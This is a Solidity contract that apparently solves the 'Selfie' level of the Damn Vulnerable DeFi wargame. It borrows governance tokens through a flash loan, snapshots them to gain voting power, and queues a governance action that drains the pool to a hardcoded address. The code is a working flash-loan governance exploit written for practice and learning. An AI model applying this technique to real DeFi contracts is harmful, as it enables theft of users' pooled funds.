pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract HackSelfie {
    ERC20Snapshot public token;
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    address payable attacker;
    uint256 public actionId;

    constructor(
        address tokenAddress,
        address poolAddress,
        address governanceAddress,
        address attackerAddress
    ) {
        token = ERC20Snapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        attacker = payable(attackerAddress);
    }

    function callFlashLoan(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function receiveTokens(address tokenAdd, uint256 amount) public {
        DamnValuableTokenSnapshot govToken = DamnValuableTokenSnapshot(
            tokenAdd
        );
        govToken.snapshot();

        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                0x70997970C51812dc3A010C7d01b50e0d17dc79C8
            ),
            0
        );
        token.transfer(address(pool), amount);
    }
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}
